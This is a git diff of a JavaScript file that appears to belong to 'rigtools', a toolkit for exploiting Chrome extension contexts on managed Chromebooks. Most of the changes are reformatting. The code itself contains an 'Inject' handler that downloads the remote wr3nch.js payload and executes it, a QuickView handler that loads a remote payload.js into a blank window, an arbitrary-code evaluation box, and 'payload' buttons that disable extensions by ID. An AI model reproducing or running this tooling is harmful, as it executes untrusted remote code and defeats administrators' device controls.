@@ -1,5 +1,3 @@
-import { url } from "inspector";
-
 onerror = alert;
 
 const uiTemplate = `
@@ -84,34 +82,35 @@ const WAIT_FOR_FINISH = 1;
 requestAnimationFrame(function a(t) {
   for (const cb of handleCallbacks_) {
     let m;
-    if ((m = cb.f.apply(null, [t - cb.t]))) {
+    if (m = (cb.f.apply(null, [t - cb.t]))) {
       if (m === 1) {
         return;
       } else {
         handleCallbacks_.splice(handleCallbacks_.indexOf(cb), 1);
       }
-    }
-  }
+    };
+  };
   requestAnimationFrame(a);
-});
+})
 const handleInAnimationFrame = (cb, thiz = null, args = []) => {
   handleCallbacks_.push({
     f: cb,
-    t: performance.now(),
+    t: performance.now()
   });
-};
+}
 
 class ExtensionCapabilities {
   static setupSlides(activeidx = 0) {
     // if (chrome.management) {
     if (false) {
-      slides.push(document.querySelector("#chrome_management_disable_ext"));
+      slides.push(document.querySelector('#chrome_management_disable_ext'));
     }
-    slides.push(document.querySelector("#ext_default"));
+    slides.push(document.querySelector('#ext_default'));
     for (let i = 0; i < slides.length; i++) {
       if (i === activeidx) {
         slides[i].style.display = "block";
-      } else {
+      }
+      else {
         slides[i].style.display = "none";
       }
     }
@@ -126,21 +125,22 @@ class ExtensionCapabilities {
       if (ev.key.toLowerCase().includes("left")) {
         activeSlideIdx--;
         if (activeSlideIdx < 0) {
-          activeSlideIdx += slides.length;
+          activeSlideIdx += (slides.length);
         }
-        activeSlideIdx %= slides.length;
+        activeSlideIdx %= (slides.length);
         ev.preventDefault();
       }
       if (ev.key.toLowerCase().includes("right")) {
         activeSlideIdx++;
         if (activeSlideIdx < 0) {
-          activeSlideIdx += slides.length;
+          activeSlideIdx += (slides.length);
         }
-        activeSlideIdx %= slides.length;
+        activeSlideIdx %= (slides.length);
         ev.preventDefault();
+
       }
       ExtensionCapabilities.setActiveSlideIndex(activeSlideIdx);
-    };
+    }
   }
   static setActiveSlideIndex(idx) {
     function a(t) {
@@ -149,31 +149,37 @@ class ExtensionCapabilities {
         // slides[i].style.display = "none";
         return true;
       }
-      slides[idx].style.opacity = String(seconds / 0.2);
+      slides[idx].style.opacity = String((seconds) / (0.2));
+
     }
     for (let i = 0; i < slides.length; i++) {
       if (i === idx) {
+
         slides[i].style.display = "block";
-      } else {
+
+      }
+      else {
         if (slides[i].style.display === "block") {
           slides[i].style.position = "absolute";
           const m = i;
           handleInAnimationFrame(function (t) {
             const seconds = t / 1000;
             if (0.8 - seconds <= 0) {
+
               slides[i].style.display = "none";
               handleInAnimationFrame(a);
               return true;
             }
-            slides[i].style.opacity = String((0.2 - seconds) / 0.2);
-          });
+            slides[i].style.opacity = String(((0.2 - seconds) / 0.2));
+
+          })
         }
         // slides[i].style.display = "none";
       }
     }
   }
 
-  activate() {}
+  activate() { }
 }
 class DefaultExtensionCapabilities extends ExtensionCapabilities {
   static template = `
@@ -187,8 +193,7 @@ class DefaultExtensionCapabilities extends ExtensionCapabilities {
     <h2>Wr3nch</h2>
     <button id="wr3nch">Inject</button>
 
-    <h2>QuickView</h2>
-    <button id="qv">Start</button>
+    <button id="qv">QuickView</button>
 
   </div>
   <br>
@@ -224,45 +229,38 @@ class DefaultExtensionCapabilities extends ExtensionCapabilities {
             listItem.textContent = isTabTitleQueryable
               ? `${info.title} (${info.url})`
               : "(not available)";
-            listItem.innerHTML +=
-              '<br/><input type="text" /> <button>Navigate</button>';
+            listItem.innerHTML += '<br/><input type="text" /> <button>Navigate</button>';
             const button = document.createElement("button");
             button.innerHTML = "Preview";
-            listItem.querySelector("button").onclick = function (ev) {
-              const inp = listItem.querySelector("input");
+            listItem.querySelector('button').onclick = function (ev) {
+              const inp = listItem.querySelector('input');
               chrome.tabs.update(info.id, {
-                url: inp.value,
+                "url": inp.value
               });
-            };
+            }
             button.onclick = () => {
               thiz.disarm = true;
 
               thiz.previewing = true;
 
-              chrome.windows.update(
-                info.windowId,
-                {
-                  focused: true,
-                },
-                function () {
-                  chrome.tabs.update(info.id, { active: true });
-                }
-              );
+              chrome.windows.update(info.windowId, {
+                focused: true
+              }, function () {
+                chrome.tabs.update(info.id, { active: true });
+
+              });
               window.currentTimeout = setTimeout(function m() {
                 clearTimeout(window.currentTimeout);
 
                 chrome.tabs.getCurrent(function (tab) {
-                  chrome.windows.update(
-                    tab.windowId,
-                    {
-                      focused: true,
-                    },
-                    function () {
-                      chrome.tabs.update(tab.id, { active: true });
-                      thiz.disarm = false;
-                      thiz.previewing = false;
-                    }
-                  );
+                  chrome.windows.update(tab.windowId, {
+                    focused: true
+                  }, function () {
+                    chrome.tabs.update(tab.id, { active: true });
+                    thiz.disarm = false;
+                    thiz.previewing = false;
+                  });
+
                 });
               }, 100);
             };
@@ -277,36 +275,23 @@ class DefaultExtensionCapabilities extends ExtensionCapabilities {
               "(Some data might not be available, because the extension doesn't have the 'tabs' permission)";
           }
         });
-      });
+      })
     });
   }
   activate() {
     document.write(DefaultExtensionCapabilities.template);
     // document.close();
-    document.body
-      .querySelector("#ext_default")
-      .querySelectorAll("button")
-      .forEach(function (btn) {
-        // alert("prepping button " + btn.id);
-        btn.addEventListener("click", this.onBtnClick_.bind(this, btn));
-      }, this);
+    document.body.querySelector("#ext_default").querySelectorAll('button').forEach(function (btn) {
+      // alert("prepping button " + btn.id);
+      btn.addEventListener("click", this.onBtnClick_.bind(this, btn));
+    }, this);
 
-    this.updateTabList(
-      document.body
-        .querySelector("#extension_tabs_default")
-        .querySelector("ol"),
-      !!chrome.runtime.getManifest().permissions.includes("tabs")
-    );
+    this.updateTabList(document.body.querySelector('#extension_tabs_default').querySelector('ol'), (!!chrome.runtime.getManifest().permissions.includes('tabs')));
     for (var i in chrome.tabs) {
-      if (i.startsWith("on")) {
+      if (i.startsWith('on')) {
         chrome.tabs[i].addListener(function (ev) {
-          this.updateTabList(
-            document.body
-              .querySelector("#extension_tabs_default")
-              .querySelector("ol"),
-            !!chrome.runtime.getManifest().permissions.includes("tabs")
-          );
-        });
+          this.updateTabList(document.body.querySelector('#extension_tabs_default').querySelector('ol'), (!!chrome.runtime.getManifest().permissions.includes('tabs')));
+        })
       }
     }
     // document.body.querySelector('')
@@ -320,6 +305,7 @@ class DefaultExtensionCapabilities extends ExtensionCapabilities {
    * @param {HTMLButtonElement} b
    */
   async onBtnClick_(b) {
+
     const fs = await DefaultExtensionCapabilities.getFS();
     function writeFile(file, data) {
       return new Promise((resolve, reject) => {
@@ -346,61 +332,54 @@ class DefaultExtensionCapabilities extends ExtensionCapabilities {
       script.id = "evaluate_elem";
       script.src = url;
       document.body.appendChild(script);
-    };
+    }
 
     switch (b.id) {
       case "code_evaluate": {
         console.log("Evaluating code!");
         const x = document.querySelector("#code_input").value;
-        exec(x);
+        exec(x)
         break;
       }
       case "tabreload": {
-        this.updateTabList(
-          document.body
-            .querySelector("#extension_tabs_default")
-            .querySelector("ol"),
-          !!chrome.runtime.getManifest().permissions.includes("tabs")
-        );
+        this.updateTabList(document.body.querySelector('#extension_tabs_default').querySelector('ol'), (!!chrome.runtime.getManifest().permissions.includes('tabs')));
         break;
       }
       case "wr3nch": {
         // Wr3nch.js
-        const wr3nch = await fetch(
-          "https://raw.githubusercontent.com/blitzbrian/rigtools/main/payloads/wr3nch.js"
-        );
+        const wr3nch = await fetch('https://raw.githubusercontent.com/blitzbrian/rigtools/main/payloads/wr3nch.js');
 
-        let x = await wr3nch.text();
+        let x = await wr3nch.text()
 
         if (
           !confirm(
             "Do you want to inject Tr3nch in the extension? This will disable other Wr3nch features"
           )
         ) {
-          x = `function script() {${prompt("Code:")}};` + x;
+          x = `function script() {${prompt('Code:')}};` + x;
         }
 
-        exec(x);
+        exec(x)
       }
       case "qv": {
         function qv() {
-          const url1 = window.open("about:blank#blocked", "_blank");
+          const url1 = window.open('about:blank#blocked', '_blank');
 
           url1.addEventListener("DOMContentLoaded", function () {
-            const script = url1.document.createElement("script");
-            script.src =
-              "https://raw.githubusercontent.com/ading2210/quickview/main/payload.js";
-            url1.document.body.appendChild(script);
-          });
+            const d = url1.document;
+            const script = d.createElement("script");
+            script.src = "https://raw.githubusercontent.com/ading2210/quickview/main/payload.js"
+            d.body.appendChild(script)
+          })
         }
-        qv();
+        qv()
         break;
       }
     }
   }
 }
 class HostPermissions {
-  activate() {}
+  activate() { }
 }
 function updateExtensionStatus(extlist_element) {
   return new Promise(function (resolve, reject) {
@@ -414,10 +393,10 @@ function updateExtensionStatus(extlist_element) {
         }
         ordlist.push(e);
         const itemElement = document.createElement("li");
-        itemElement.classList.add("extension-item");
+        itemElement.classList.add("extension-item")
         itemElement.textContent = `${e.name} (${e.id}) `;
-        const aElem = document.createElement("a");
-        aElem.classList.add("extension-item-toggle");
+        const aElem = document.createElement('a');
+        aElem.classList.add("extension-item-toggle")
         aElem.href = "javascript:void(0)";
         aElem.innerText = `${e.enabled ? "enabled" : "disabled"}`;
         aElem.onclick = function () {
@@ -426,7 +405,7 @@ function updateExtensionStatus(extlist_element) {
           setTimeout(function () {
             updateExtensionStatus(extlist_element);
           }, 200);
-        };
+        }
         // e++;
         itemElement.appendChild(aElem);
         extlist_element.appendChild(itemElement);
@@ -443,7 +422,7 @@ const fileManagerPrivateTemplate = `
     </div>
   </div>
 
-`;
+`
 onload = async function x() {
   let foundNothing = true;
   document.open();
@@ -451,7 +430,8 @@ onload = async function x() {
     // alert(1);
     chrome.fileManagerPrivate.openURL("data:text/html,<h1>Hello</h1>");
     document.write(fileManagerPrivateTemplate);
-    document.body.querySelector("#btn_FMP_openURL").onclick = function (ev) {};
+    document.body.querySelector('#btn_FMP_openURL').onclick = function (ev) {
+    };
   }
 
   if (chrome.management.setEnabled) {
@@ -459,15 +439,13 @@ onload = async function x() {
     const extlist_element = document.querySelector(".extlist");
     await updateExtensionStatus(extlist_element);
     const container_extensions = document.body.querySelector(
-      "#chrome_management_disable_ext"
+      "#chrome_management_disable_ext",
     );
     container_extensions.querySelector(".extnum").style.display = "none";
     container_extensions.querySelector("#toggler").style.display = "none";
     // alert("loading button");
     // alert(container_extensions.querySelector("button"));
-    container_extensions.querySelector("#toggler").onclick = async function dx(
-      e
-    ) {
+    container_extensions.querySelector("#toggler").onclick = async function dx(e) {
       // open();
       container_extensions.querySelector("#toggler").disabled = true;
 
@@ -487,7 +465,7 @@ onload = async function x() {
         chrome.management.setEnabled(
           savedExtList[id - 1].id,
           !savedExtList[id - 1].enabled,
-          resolve
+          resolve,
         );
       });
 
@@ -496,29 +474,26 @@ onload = async function x() {
     };
     container_extensions.querySelector("#toggler").disabled = false;
     // payload stuff :D
-    container_extensions.querySelector("#payload-1").onclick =
-      async function dx(e) {
-        var exttokill;
-        while (!exttokill) {
-          exttokill = prompt("Extension id?");
-          if (exttokill === "cancel") {
-            return;
-          }
+    container_extensions.querySelector("#payload-1").onclick = async function dx(e) {
+      var exttokill;
+      while (!exttokill) {
+        exttokill = prompt('Extension id?');
+        if (exttokill === "cancel") {
+          return;
         }
-        if (exttokill) {
-          chrome.management.setEnabled(exttokill, false);
-        }
-      };
-    container_extensions.querySelector("#payload-2").onclick =
-      async function dx(e) {
-        var alertcurrentid = chrome.runtime.id;
-        alert(alertcurrentid);
-      };
-    container_extensions.querySelector("#payload-3").onclick =
-      async function dx(e) {
-        var grabidtokill = chrome.runtime.id;
-        chrome.management.setEnabled(grabidtokill, false);
-      };
+      }
+      if (exttokill) {
+        chrome.management.setEnabled(exttokill, false);
+      }
+    };
+    container_extensions.querySelector("#payload-2").onclick = async function dx(e) {
+      var alertcurrentid = chrome.runtime.id;
+      alert(alertcurrentid);
+    };
+    container_extensions.querySelector("#payload-3").onclick = async function dx(e) {
+      var grabidtokill = chrome.runtime.id;
+      chrome.management.setEnabled(grabidtokill, false);
+    };
   }
   const otherFeatures = window.chrome.runtime.getManifest();
   const permissions = otherFeatures.permissions;
